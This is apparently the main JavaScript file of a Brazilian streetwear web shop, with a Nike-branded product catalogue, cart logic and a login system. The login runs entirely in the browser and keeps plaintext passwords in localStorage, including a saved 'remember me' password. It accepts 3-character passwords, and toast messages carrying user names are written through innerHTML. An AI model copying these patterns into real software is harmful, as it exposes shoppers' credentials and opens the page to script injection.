/**
 * AURUM STREET - Streetwear E-commerce
 * JavaScript Principal - Versão PHP Backend
 */

// ========================================
// VERIFICAÇÃO DE VERSÃO
// ========================================
console.log('%c🚀 AURUM STREET JS v20240110-NETLIFY-INVICTUSPAY', 'background: #D4AF37; color: #000; font-size: 16px; padding: 8px; font-weight: bold;');
console.log('%c✅ Backend: Netlify Functions | Integracao: InvictusPay', 'color: green; font-size: 12px;');

// ========================================
// CONFIGURAÇÕES DA API (NETLIFY FUNCTIONS - INVICTUSPAY)
// ========================================

const API_CONFIG = {
    baseUrl: '/.netlify/functions',
    endpoints: {
        createCheckout: '/.netlify/functions/checkout',
        checkStatus: '/.netlify/functions/status',
        health: '/.netlify/functions/health',
        products: '/.netlify/functions/products'
    },
    timeout: 30000
};

const JS_VERSION = '20240110-NETLIFY-INVICTUSPAY-' + Date.now();
console.log('[App] Versão JS:', JS_VERSION);

// ========================================
// DADOS DOS PRODUTOS (Organizado por Categoria)
// ========================================

const products = [
    // ==================== ABA 1 - KITS E CAMISETAS ====================
    // PRODUTOS 1-8
    {
        id: 'kit-future-nike',
        name: 'Kit Future x Nike Club',
        category: 'kits',
        categoryLabel: 'Kits',
        tabLabel: 'Aba 1',
        price: 180,
        originalPrice: 250,
        description: 'O kit completo do streetwear! Inclui inúmera, bermuda e slide Nike.',
        sizes: ['P', 'M', 'G', 'GG'],
        slideSizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Kit Completo', hex: '#D4AF37', image: 'KIT-FUTURE-NIKE-CLUB-FINAL.jpg' }],
        images: ['KIT-FUTURE-NIKE-CLUB-FINAL.jpg'],
        badge: 'SUPER KIT',
        isOffer: true,
        product_hash: 'ygtf8ueiej'
    },
    {
        id: 'kit-basico',
        name: 'Kit Camiseta + Bermuda + Slide',
        category: 'kits',
        categoryLabel: 'Kits',
        tabLabel: 'Aba 1',
        price: 150,
        originalPrice: 180,
        description: 'O essentials kit para o verao! Combinacao perfeita de conforto e estilo.',
        sizes: ['P', 'M', 'G', 'GG'],
        slideSizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Kit Essentials', hex: '#1a1a1a', image: 'kit-basico.jpg' }],
        images: ['kit-basico.jpg'],
        badge: 'KITS',
        isOffer: true,
        product_hash: 'adrcv7uwe1'
    },
    {
        id: 'kit-academy',
        name: 'Kit Academy Nike',
        category: 'kits',
        categoryLabel: 'Kits',
        tabLabel: 'Aba 1',
        price: 150,
        originalPrice: 250,
        description: 'O kit perfeito para o natal e o verao! Inclui bervari em tecido tecnico, shorts esportivo premium e slide Nike Asuna.',
        sizes: ['P', 'M', 'G', 'GG'],
        slideSizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Kit Completo', hex: '#722F37', image: 'ACADEMY DO NATAL! 🎅🔥Compre pelo nosso site- www.tiosimon.com.br⚠️ todas as mídias são feitas p.jpg' }],
        images: ['ACADEMY DO NATAL! 🎅🔥Compre pelo nosso site- www.tiosimon.com.br⚠️ todas as mídias são feitas p.jpg', 'ACADEMY DO NATAL! 🎅🔥Compre pelo nosso site- www.tiosimon.com.br⚠️ todas as mídias são feitas p (1).jpg', 'ACADEMY DO NATAL! 🎅🔥Compre pelo nosso site- www.tiosimon.com.br⚠️ todas as mídias são feitas p (2).jpg', 'ACADEMY DO NATAL! 🎅🔥Compre pelo nosso site- www.tiosimon.com.br⚠️ todas as mídias são feitas p (3).jpg'],
        badge: 'NOVO',
        isOffer: true,
        product_hash: 'wtuhpphpmp'
    },
    {
        id: 'kit-club-preto',
        name: 'Kit Club Preto + TN Azul',
        category: 'kits',
        categoryLabel: 'Kits',
        tabLabel: 'Aba 1',
        price: 799,
        originalPrice: null,
        description: 'O kit completo na cor preta! Inclui bervari tecnica, shorts premium e TN Azul. Design moderno e elegante para o streetwear.',
        sizes: ['P', 'M', 'G', 'GG'],
        tnSizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Preto/Azul', hex: '#1a1a1a', image: 'KIT-CLUB-4.jpg' }],
        images: ['KIT-CLUB-4.jpg', 'KIT-CLUB-5.jpg', 'KIT-CLUB-6.jpg'],
        badge: 'EXCLUSIVO',
        isOffer: false,
        product_hash: 'a5rq6te8he'
    },
    {
        id: 'kit-future-jaqueta',
        name: 'Kit Future + TN Purple',
        category: 'kits',
        categoryLabel: 'Kits',
        tabLabel: 'Aba 1',
        price: 799,
        originalPrice: null,
        description: 'O kit completo com bervari e JAQUETA FUTURE + TN Purple! O look completo para quem exige o melhor do streetwear brasileiro.',
        sizes: ['P', 'M', 'G', 'GG'],
        tnSizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Preto/Roxo', hex: '#1a1a1a', image: 'KIT-FUTURE-1.jpg' }],
        images: ['KIT-FUTURE-1.jpg', 'KIT-FUTURE-2.jpg', 'KIT-FUTURE-3.jpg', 'KIT-FUTURE-4.jpg'],
        badge: 'PREMIUM',
        isOffer: false,
        product_hash: 'cywzwfazwk'
    },
    {
        id: 'athletics-tn-set',
        name: 'Athletics + TN Purple',
        category: 'kits',
        categoryLabel: 'kits',
        tabLabel: 'Aba 1',
        price: 799,
        originalPrice: null,
        description: 'O look completo Athletics + TN Purple! Conjunto estiloso que combina perfeitamente. Inclui bervari oversized, calca wide e TN Purple.',
        sizes: ['P', 'M', 'G', 'GG'],
        tnSizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Black/Purple', hex: '#1a1a1a', image: 'ATHLETICS-TN-1.jpg' }],
        images: ['ATHLETICS-TN-1.jpg', 'ATHLETICS-TN-2.jpg', 'ATHLETICS-TN-3.jpg'],
        badge: 'SET',
        isOffer: false,
        product_hash: '65xpct9mha'
    },
    {
        id: 'blusa-tech-fleece',
        name: 'Blusa Tech Fleece',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 1',
        price: 299,
        originalPrice: null,
        description: 'Tecnologia e estilo em uma peca unica! A blusa Tech Fleece oferece o equilibrio perfeito entre aquecimento e respirabilidade.',
        sizes: ['P', 'M', 'G', 'GG'],
        colors: [{ name: 'Preto', hex: '#1a1a1a', image: 'BLUSA TECH FLEECE! 🔥🥷🏻Papo de exclusividade…📦 Enviamos para todo o Brasil🛵 Entregamos via U.jpg' }],
        images: ['BLUSA TECH FLEECE! 🔥🥷🏻Papo de exclusividade…📦 Enviamos para todo o Brasil🛵 Entregamos via U.jpg'],
        badge: 'Exclusivo',
        isOffer: false,
        product_hash: 'wrvguoah99'
    },
    {
        id: 'nike-by-swoosh',
        name: 'Nike by Swoosh 3 Und. Preta',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 1',
        price: 150,
        originalPrice: 180,
        description: 'Simples, direto e estiloso! A peca perfeita para quem aprecia o minimalismo com a qualidade garantida da Nike.',
        sizes: ['P', 'M', 'G', 'GG'],
        colors: [{ name: 'Preto', hex: '#1a1a1a', image: 'NIKE BY SWOOSH ☑️☑️ R$60,00📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região.jpg' }],
        images: ['NIKE BY SWOOSH ☑️☑️ R$60,00📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região.jpg'],
        badge: 'Best Seller',
        isOffer: true,
        product_hash: 'hdj1vwhamc'
    },
    
    // ==================== ABA 2 - DEMAIS PRODUTOS ====================
    // PRODUTOS 9-16
    {
        id: 'nocta-x-nike',
        name: 'Camiseta Nocta x Nike 3 Und. Cores Sortidas',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 2',
        price: 150,
        originalPrice: 180,
        description: 'A colaboracao mais esperada do ano! As camisetas Nike Nocta representam o apice do streetwear de luxo. Kit com 3 unidades em cores sortidas.',
        sizes: ['P', 'M', 'G', 'GG'],
        colors: [{ name: 'Sortidas', hex: '#D4AF37', image: 'PROMO NOCTA X NIKE 🚨Camisetas Nike Nocta por apenas R$60,00 ou 3 camisetas por R$150,00📦 Envia.jpg' }],
        images: ['PROMO NOCTA X NIKE 🚨Camisetas Nike Nocta por apenas R$60,00 ou 3 camisetas por R$150,00📦 Envia.jpg'],
        badge: 'NOCTA',
        isOffer: true,
        product_hash: '9ow2epx6xf'
    },
    {
        id: 'plantaris',
        name: 'Plantaris Brazil',
        category: 'acessorios',
        categoryLabel: 'Acessórios',
        tabLabel: 'Aba 2',
        price: 100,
        originalPrice: 150,
        description: 'Queima de estoque! Esta e a chance de garantir seus oculos Plantaris com preco especial.',
        sizes: ['Unico'],
        colors: [{ name: 'Marrom', hex: '#8B4513', image: 'PLANTARIS TA NA CASA! 🔥🔥🔥🔥QUEIMA DE ESTOQUE R$100,00 Cada 🚨🚨📦 Enviamos para todo o Brasil (1).jpg' }, { name: 'Preto', hex: '#1a1a1a', image: 'PLANTARIS TA NA CASA! 🔥🔥🔥🔥QUEIMA DE ESTOQUE R$100,00 Cada 🚨🚨📦 Enviamos para todo o Brasil (2).jpg' }, { name: 'Azul', hex: '#1E88E5', image: 'PLANTARIS TA NA CASA! 🔥🔥🔥🔥QUEIMA DE ESTOQUE R$100,00 Cada 🚨🚨📦 Enviamos para todo o Brasil (3).jpg' }],
        images: ['PLANTARIS TA NA CASA! 🔥🔥🔥🔥QUEIMA DE ESTOQUE R$100,00 Cada 🚨🚨📦 Enviamos para todo o Brasil.jpg', 'PLANTARIS TA NA CASA! 🔥🔥🔥🔥QUEIMA DE ESTOQUE R$100,00 Cada 🚨🚨📦 Enviamos para todo o Brasil (2).jpg', 'PLANTARIS TA NA CASA! 🔥🔥🔥🔥QUEIMA DE ESTOQUE R$100,00 Cada 🚨🚨📦 Enviamos para todo o Brasil (1).jpg', 'PLANTARIS TA NA CASA! 🔥🔥🔥🔥QUEIMA DE ESTOQUE R$100,00 Cada 🚨🚨📦 Enviamos para todo o Brasil (3).jpg'],
        badge: 'OFERTA',
        isOffer: true,
        product_hash: 'n3nhxjzpwi'
    },
    {
        id: 'moletom-multiswoosh',
        name: 'Moletom Multiswoosh',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 2',
        price: 100,
        originalPrice: null,
        description: 'O moletom que todo sneakerhead ama! Design iconico com multiplos logos swoosh em contraste.',
        sizes: ['P', 'M', 'G', 'GG'],
        colors: [{ name: 'Preto', hex: '#1a1a1a', image: 'Moletom MULTISWOOSH 💫R$100,00 📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra re.jpg' }],
        images: ['Moletom MULTISWOOSH 💫R$100,00 📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra re.jpg'],
        badge: null,
        isOffer: false,
        product_hash: 'wpspf6nny6'
    },
    {
        id: 'calca-jogador',
        name: 'Calca Jogador Premium',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 2',
        price: 150,
        originalPrice: null,
        description: 'A calca que todo jogador precisa ter no guarda-roupa! Corte moderno com ajuste perfeito.',
        sizes: ['38', '40', '42', '44', '46', '48'],
        colors: [{ name: 'Preto', hex: '#1a1a1a', image: 'CALCA-JOGADOR-1.jpg' }],
        images: ['CALCA-JOGADOR-1.jpg'],
        badge: null,
        isOffer: false,
        product_hash: 'fi4agnrlvo'
    },
    {
        id: 'air-max-tn-orange',
        name: 'Nike Air Max TN Orange',
        category: 'tenis',
        categoryLabel: 'Tenis',
        tabLabel: 'Aba 2',
        price: 799,
        originalPrice: null,
        description: 'O iconico Air Max TN agora na versao Orange! Design revolucionario com a tecnologia de amortecimento Air Max.',
        sizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Laranja', hex: '#FF6B35', image: 'AIR MAX TN ORANGE! 🍊🔑📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região de  (1).jpg' }, { name: 'Preto', hex: '#1a1a1a', image: 'AIR MAX TN ORANGE! 🍊🔑📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região de .jpg' }],
        images: ['AIR MAX TN ORANGE! 🍊🔑📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região de  (1).jpg', 'AIR MAX TN ORANGE! 🍊🔑📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região de .jpg'],
        badge: null,
        isOffer: false,
        product_hash: 'lbdjd23mcx'
    },
    {
        id: 'tn-purple',
        name: 'TN Purple',
        category: 'tenis',
        categoryLabel: 'Tenis',
        tabLabel: 'Aba 2',
        price: 599,
        originalPrice: null,
        description: 'O lendario TN na cor Purple! Design iconico que define o streetwear. Tamanhos exclusivos disponiveis.',
        sizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Purple', hex: '#8B5CF6', image: 'TN-PURPLE-1.jpg' }],
        images: ['TN-PURPLE-1.jpg', 'TN-PURPLE-2.jpg', 'TN-PURPLE-3.jpg', 'TN-PURPLE-4.jpg', 'TN-PURPLE-5.jpg'],
        badge: 'LIMITADO',
        isOffer: false,
        product_hash: 'yog2xwpdij'
    },
    {
        id: 'air-force-white',
        name: 'Nike Air Force 1 White',
        category: 'tenis',
        categoryLabel: 'Tenis',
        tabLabel: 'Aba 2',
        price: 499,
        originalPrice: null,
        description: 'O classico absoluto do streetwear! O Air Force 1 White e um simbolo de estilo que transcende geracoes.',
        sizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'White', hex: '#FFFFFF', image: 'FORCEZADA WHITE! ⚪️🥷🏻📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região de .jpg' }],
        images: ['FORCEZADA WHITE! ⚪️🥷🏻📦 Enviamos para todo o Brasil🛵 Entregamos via Uber flash pra região de .jpg'],
        badge: null,
        isOffer: false,
        product_hash: 'cat13n1jrm'
    },
    {
        id: 'nike-dunk-twist',
        name: 'Nike Dunk Low Twist',
        category: 'tenis',
        categoryLabel: 'tenis',
        tabLabel: 'Aba 2',
        price: 599,
        originalPrice: 799,
        description: 'O Nike Dunk Low Twist traz um visual moderno ao classico! Design inovador com Swoosh em relevo 3D.',
        sizes: ['36', '37', '38', '39', '40', '41', '42', '43', '44'],
        colors: [{ name: 'Off-White', hex: '#E8E8E8', image: 'DUNK TWIST NA PISTA! ⚪️✍🏼esse aqui é lindo demais…Compre pelo nosso site- www.tiosimon.com.br⚠️.jpg' }],
        images: ['DUNK TWIST NA PISTA! ⚪️✍🏼esse aqui é lindo demais…Compre pelo nosso site- www.tiosimon.com.br⚠️.jpg', 'DUNK TWIST NA PISTA! ⚪️✍🏼esse aqui é lindo demais…Compre pelo nosso site- www.tiosimon.com.br⚠️ (1).jpg', 'DUNK TWIST NA PISTA! ⚪️✍🏼esse aqui é lindo demais…Compre pelo nosso site- www.tiosimon.com.br⚠️ (2).jpg'],
        badge: 'NOVO',
        isOffer: true,
        product_hash: 'ba4f9sl2y4'
    },
    {
        id: 'conjunto-nk-academy-preto-branco',
        name: 'Conjunto NK Academy Dri Fit Verão',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 2',
        price: 120,
        originalPrice: 150,
        description: 'Conjunto NK Academy Dri Fit Verão nas cores preto e branco. Conforto, respirabilidade e muito estilo para o seu dia a dia e treinos.',
        sizes: ['P', 'M', 'G'],
        colors: [{ name: 'Preto/Branco', hex: '#000000', image: 'conjunto-nike-academy-preto-branco.png'}],
        images: ['conjunto-nike-academy-preto-branco.png'],
        badge: 'OFERTA',
        isOffer: true,
        product_hash: 'cjnkacad01'
    },
    {
        id: 'conjunto-nk-azul-marinho',
        name: 'Conjunto NK Azul Marinho',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 2',
        price: 120,
        originalPrice: 150,
        description: 'Conjunto NK Azul Marinho. Conforto, respirabilidade e muito estilo para o seu dia a dia e treinos.',
        sizes: ['P', 'M', 'G'],
        colors: [{ name: 'Azul Marinho', hex: '#000080', image: 'conjunto-nk-azul-marinho.png' }],
        images: ['conjunto-nk-azul-marinho.png'],
        badge: 'OFERTA',
        isOffer: true,
        product_hash: 'cjnkazul01'
    },
    {
        id: 'conjunto-nk-tech-branco',
        name: 'Conjunto NK Tech Branco',
        category: 'roupas',
        categoryLabel: 'Roupas',
        tabLabel: 'Aba 2',
        price: 300,
        originalPrice: 450,
        description: 'Conjunto NK Tech Branco. Design moderno, conforto e máxima exclusividade para o seu estilo.',
        sizes: ['P', 'M', 'G'],
        colors: [{ name: 'Branco', hex: '#FFFFFF', image: 'conjunto-nk-tech-branco.png' }],
        images: ['conjunto-nk-tech-branco.png'],
        badge: 'OFERTA',
        isOffer: true,
        product_hash: 'cjnktechbr01'
    },
    {
        id: 'kit-nk-athletics-tm',
        name: 'Kit NK Athletics + TM',
        category: 'kits',
        categoryLabel: 'Kits',
        tabLabel: 'Aba 2',
        price: 749.99,
        description: 'Kit NK Athletics + TM. Design exclusivo, conforto e máximo estilo para o seu dia a dia.',
        sizes: ['P', 'M', 'G'],
        colors: [{ name: 'Padrão', hex: '#111111', image: 'kit-nk-athletics+tm.png' }],
        images: ['kit-nk-athletics+tm.png'],
        badge: 'NOVO',
        isOffer: false,
        product_hash: 'kitnkath01'
    },
];

// ========================================
// ESTADO DA APLICAÇÃO
// ========================================

let cart = JSON.parse(localStorage.getItem('aurumCart')) || [];
let currentProduct = null;
let selectedColor = null;
let selectedSize = null;
let selectedSlideSize = null;
let selectedQuantity = 1;

// ========================================
// VARIÁVEIS GLOBAIS DE CHECKOUT
// ========================================

let currentPixCode = '';
let currentBilletLine = '';

// ========================================
// ELEMENTOS DOM
// ========================================

const productsGrid = document.getElementById('productsGrid');
const cartBtn = document.getElementById('cartBtn');
const cartDrawer = document.getElementById('cartDrawer');
const cartOverlay = document.getElementById('cartOverlay');
const closeCartBtn = document.getElementById('closeCart');
const cartItemsContainer = document.getElementById('cartItems');
const cartEmpty = document.getElementById('cartEmpty');
const cartFooter = document.getElementById('cartFooter');
const cartCount = document.getElementById('cartCount');
const cartSubtotal = document.getElementById('cartSubtotal');
const cartTotal = document.getElementById('cartTotal');
const cartDiscount = document.getElementById('cartDiscount');
const discountAmount = document.getElementById('discountAmount');
const checkoutBtn = document.getElementById('checkoutBtn');
const mobileMenuBtn = document.getElementById('mobileMenuBtn');
const navMenu = document.querySelector('.nav-menu');
const filterBtns = document.querySelectorAll('.filter-btn');
const navLinks = document.querySelectorAll('.nav-link');

// ========================================
// AUTENTICAÇÃO - VARIÁVEIS
// ========================================

let currentUser = null;
const USERS_STORAGE_KEY = 'aurum_users';
const CURRENT_USER_KEY = 'aurum_current_user';

// ========================================
// AUTENTICAÇÃO - FUNÇÕES
// ========================================

function getUsers() {
    const users = localStorage.getItem(USERS_STORAGE_KEY);
    return users ? JSON.parse(users) : {};
}

function saveUsers(users) {
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
}

function getCurrentUser() {
    const user = localStorage.getItem(CURRENT_USER_KEY);
    return user ? JSON.parse(user) : null;
}

function setCurrentUser(user) {
    localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
    currentUser = user;
    updateUserUI();
}

function clearCurrentUser() {
    localStorage.removeItem(CURRENT_USER_KEY);
    currentUser = null;
    updateUserUI();
}

function updateUserUI() {
    const userBtn = document.getElementById('userBtn');
    const userStatus = document.getElementById('userStatus');
    const userModalTitle = document.getElementById('userModalTitle');
    
    if (currentUser) {
        userStatus.classList.remove('logged-out');
        userStatus.classList.add('logged-in');
        userStatus.title = `Logado como: ${currentUser.username}`;
        
        // Atualizar título do modal se necessário
        if (userModalTitle) {
            userModalTitle.textContent = 'Minha Conta';
        }
    } else {
        userStatus.classList.remove('logged-in');
        userStatus.classList.add('logged-out');
        userStatus.title = 'Não logado';
    }
}

function openUserModal() {
    const userModal = document.getElementById('userModal');
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');
    const loggedInView = document.getElementById('loggedInView');
    
    if (currentUser) {
        // Mostrar visão de usuário logado
        loginForm.style.display = 'none';
        registerForm.style.display = 'none';
        loggedInView.style.display = 'block';
        
        // Preencher dados do usuário
        document.getElementById('loggedInName').textContent = currentUser.name;
        document.getElementById('loggedInUsername').textContent = '@' + currentUser.username;
        document.getElementById('loggedInEmail').textContent = currentUser.email || '-';
        
        // Formatar data
        const memberDate = new Date(currentUser.createdAt);
        const formattedDate = memberDate.toLocaleDateString('pt-BR', { day: '2-digit', month: 'long', year: 'numeric' });
        document.getElementById('loggedInDate').textContent = formattedDate;
    } else {
        // Mostrar formulário de login
        loginForm.style.display = 'block';
        registerForm.style.display = 'none';
        loggedInView.style.display = 'none';
        
        // Preencher com dados salvos se "lembrar login" estiver ativo
        const rememberLogin = document.getElementById('rememberLogin');
        if (rememberLogin && rememberLogin.checked) {
            const savedUser = localStorage.getItem('aurum_remembered_user');
            if (savedUser) {
                const data = JSON.parse(savedUser);
                document.getElementById('loginUsername').value = data.username || '';
                document.getElementById('loginPassword').value = data.password || '';
            }
        }
    }
    
    document.body.classList.add('locked');
    userModal.classList.add('active');
}

function closeUserModal() {
    const userModal = document.getElementById('userModal');
    document.body.classList.remove('locked');
    userModal.classList.remove('active');
    
    // Limpar formulários
    document.getElementById('loginForm').reset();
    document.getElementById('registerForm').reset();
}

function toggleToRegister() {
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('registerForm').style.display = 'block';
    document.getElementById('toggleToRegister').style.display = 'none';
    document.getElementById('toggleToLogin').style.display = 'inline';
    document.getElementById('userModalTitle').textContent = 'Cadastro';
}

function toggleToLogin() {
    document.getElementById('loginForm').style.display = 'block';
    document.getElementById('registerForm').style.display = 'none';
    document.getElementById('toggleToRegister').style.display = 'inline';
    document.getElementById('toggleToLogin').style.display = 'none';
    document.getElementById('userModalTitle').textContent = 'Login';
}

function handleLogin(e) {
    e.preventDefault();
    
    const username = document.getElementById('loginUsername').value.trim();
    const password = document.getElementById('loginPassword').value;
    const rememberLogin = document.getElementById('rememberLogin').checked;
    
    // Puxa os usuários cadastrados
    const users = getUsers();
    const user = users[username];
    
    if (user) {
        // Usuário existe, verificar senha
        if (user.password === password) {
            setCurrentUser(user);
            closeUserModal();
            showToast(`Bem-vindo de volta, ${user.name || username}!`, 'success');
            
            if (rememberLogin) {
                localStorage.setItem('aurum_remembered_user', JSON.stringify({ username, password }));
            } else {
                localStorage.removeItem('aurum_remembered_user');
            }
        } else {
            showToast('Senha incorreta!', 'error');
        }
    } else {
        // bloqueia quem não tem conta!
        showToast('Usuário não encontrado! Faça o cadastro primeiro.', 'error');
    }
}

function handleRegister(e) {
    e.preventDefault();
    
    const name = document.getElementById('registerName').value.trim();
    const username = document.getElementById('registerUsername').value.trim();
    const email = document.getElementById('registerEmail').value.trim();
    const password = document.getElementById('registerPassword').value;
    const confirmPassword = document.getElementById('registerConfirmPassword').value;
    const rememberLogin = document.getElementById('rememberRegister').checked;
    
    // Validações
    if (!name || !username || !email || !password) {
        showToast('Por favor, preencha todos os campos!', 'warning');
        return;
    }
    
    if (password !== confirmPassword) {
        showToast('As senhas não coincidem!', 'error');
        return;
    }
    
    if (password.length < 3) {
        showToast('A senha deve ter pelo menos 3 caracteres!', 'warning');
        return;
    }
    
    // Verificar se usuário já existe
    const users = getUsers();
    
    if (users[username]) {
        showToast('Este nome de usuário já está em uso!', 'error');
        return;
    }
    
    // Criar novo usuário
    const newUser = {
        username: username,
        password: password,
        name: name,
        email: email,
        createdAt: new Date().toISOString()
    };
    
    users[username] = newUser;
    saveUsers(users);
    
    setCurrentUser(newUser);
    closeUserModal();
    showToast(`Bem-vindo, ${name}! Cadastro realizado com sucesso!`, 'success');
    
    // Salvar para lembrar login se solicitado
    if (rememberLogin) {
        localStorage.setItem('aurum_remembered_user', JSON.stringify({ username, password }));
    } else {
        localStorage.removeItem('aurum_remembered_user');
    }
}

function handleLogout() {
    clearCurrentUser();
    localStorage.removeItem('aurum_remembered_user');
    closeUserModal();
    showToast('Você saiu da sua conta!', 'success');
}

function isUserLoggedIn() {
    return currentUser !== null;
}

function requireLoginForCheckout() {
    if (!isUserLoggedIn()) {
        // Mostrar modal de login necessário
        const loginRequiredModal = document.getElementById('loginRequiredModal');
        document.body.classList.add('locked');
        loginRequiredModal.classList.add('active');
        return false;
    }
    return true;
}

function closeLoginRequiredModal() {
    const loginRequiredModal = document.getElementById('loginRequiredModal');
    document.body.classList.remove('locked');
    loginRequiredModal.classList.remove('active');
}

function goToLoginFromRequired() {
    closeLoginRequiredModal();
    setTimeout(() => {
        openUserModal();
    }, 200);
}

// ========================================
// FLOATING BUTTONS (Back to Top + Cart)
// ========================================

function initFloatingButtons() {
    const backToTopBtn = document.getElementById('backToTopBtn');
    const floatingCartBtn = document.getElementById('floatingCartBtn');
    
    // Mostrar/ocultar botão de voltar ao topo baseado no scroll
    window.addEventListener('scroll', () => {
        if (window.scrollY > 300) {
            backToTopBtn.classList.add('visible');
        } else {
            backToTopBtn.classList.remove('visible');
        }
    });
    
    // Scroll suave para o topo
    backToTopBtn.addEventListener('click', () => {
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });
    
    // Abrir carrinho quando clicar no botão flutuante do carrinho
    if (floatingCartBtn) {
        floatingCartBtn.addEventListener('click', () => {
            openCart();
        });
    }
}

function updateFloatingCartCount() {
    const floatingCartCount = document.getElementById('floatingCartCount');
    if (floatingCartCount) {
        const totalCount = cart.reduce((sum, item) => sum + item.quantity, 0);
        floatingCartCount.textContent = totalCount;
        
        // Mostrar/ocultar badge baseado na quantidade
        if (totalCount > 0) {
            floatingCartCount.style.display = 'flex';
        } else {
            floatingCartCount.style.display = 'none';
        }
    }
}

// ========================================
// EVENT LISTENERS - AUTENTICAÇÃO
// ========================================

// User button
const userBtn = document.getElementById('userBtn');
if (userBtn) {
    userBtn.addEventListener('click', openUserModal);
}

// Close user modal
const closeUserModalBtn = document.getElementById('closeUserModal');
if (closeUserModalBtn) {
    closeUserModalBtn.addEventListener('click', closeUserModal);
}

// User modal overlay
const userModal = document.getElementById('userModal');
if (userModal) {
    userModal.querySelector('.modal-overlay').addEventListener('click', closeUserModal);
}

// Toggle to register
const toggleToRegisterBtn = document.querySelector('#toggleToRegister .toggle-btn');
if (toggleToRegisterBtn) {
    toggleToRegisterBtn.addEventListener('click', toggleToRegister);
}

// Toggle to login
const toggleToLoginBtn = document.querySelector('#toggleToLogin .toggle-btn');
if (toggleToLoginBtn) {
    toggleToLoginBtn.addEventListener('click', toggleToLogin);
}

// Toggle to login from register
const toggleToLoginFromRegisterBtn = document.querySelector('#toggleToLoginFromRegister .toggle-btn');
if (toggleToLoginFromRegisterBtn) {
    toggleToLoginFromRegisterBtn.addEventListener('click', toggleToLogin);
}

// Login form
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    loginForm.addEventListener('submit', handleLogin);
}

// Register form
const registerForm = document.getElementById('registerForm');
if (registerForm) {
    registerForm.addEventListener('submit', handleRegister);
}

// Logout button
const logoutBtn = document.getElementById('logoutBtn');
if (logoutBtn) {
    logoutBtn.addEventListener('click', handleLogout);
}

// Login required modal
const closeLoginRequiredBtn = document.getElementById('closeLoginRequired');
if (closeLoginRequiredBtn) {
    closeLoginRequiredBtn.addEventListener('click', closeLoginRequiredModal);
}

const loginRequiredModal = document.getElementById('loginRequiredModal');
if (loginRequiredModal) {
    loginRequiredModal.querySelector('.modal-overlay').addEventListener('click', closeLoginRequiredModal);
}

const goToLoginBtn = document.getElementById('goToLoginBtn');
if (goToLoginBtn) {
    goToLoginBtn.addEventListener('click', goToLoginFromRequired);
}

const goToRegisterBtn = document.getElementById('goToRegisterBtn');
if (goToRegisterBtn) {
    goToRegisterBtn.addEventListener('click', () => {
        closeLoginRequiredModal();
        setTimeout(() => {
            openUserModal();
            toggleToRegister();
        }, 200);
    });
}

// Modificar botão de checkout para verificar login
checkoutBtn.addEventListener('click', () => {
    console.log('[Checkout] 🔘 Botão Ir para Checkout clicado!');
    console.log('[Checkout] Itens no carrinho:', cart.length);
    if (cart.length === 0) {
        showToast('Seu carrinho está vazio!', 'warning');
        return;
    }
    
    // Verificar se usuário está logado
    if (!requireLoginForCheckout()) {
        return;
    }
    
    console.log('[Checkout] Abrindo modal de checkout...');
    openCheckoutModal();
});

const productModal = document.getElementById('productModal');
const sizeGuideModal = document.getElementById('sizeGuideModal');
const closeProductBtn = document.getElementById('closeProduct');
const closeSizeGuideBtn = document.getElementById('closeSizeGuide');
const openSizeGuideBtn = document.getElementById('openSizeGuide');
const sizeTabs = document.querySelectorAll('.size-tab');

const toast = document.getElementById('toast');
const toastMessage = document.getElementById('toastMessage');

const checkoutModal = document.getElementById('checkoutModal');
const closeCheckoutBtn = document.getElementById('closeCheckout');
const checkoutForm = document.getElementById('checkoutForm');
const checkoutLoading = document.getElementById('checkoutLoading');
const checkoutError = document.getElementById('checkoutError');

// ========================================
// FUNÇÕES UTILITÁRIAS
// ========================================

function formatPrice(price) {
    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(price);
}

function showToast(message, type = 'success') {
    toastMessage.textContent = message;
    toast.classList.remove('success', 'error', 'warning');
    toast.classList.add('active', type);
    
    // Adicionar ícone baseado no tipo
    let icon = '✓';
    if (type === 'error') icon = '✕';
    else if (type === 'warning') icon = '⚠';
    else icon = '✓';
    
    toastMessage.innerHTML = `<span class="toast-icon">${icon}</span>${message}`;
    
    // Animação de entrada
    toast.style.animation = 'none';
    toast.offsetHeight; // Trigger reflow
    toast.style.animation = 'slideInUp 0.3s ease forwards';
    
    setTimeout(() => {
        toast.style.animation = 'slideOutDown 0.3s ease forwards';
        setTimeout(() => {
            toast.classList.remove('active');
        }, 300);
    }, 3000);
}

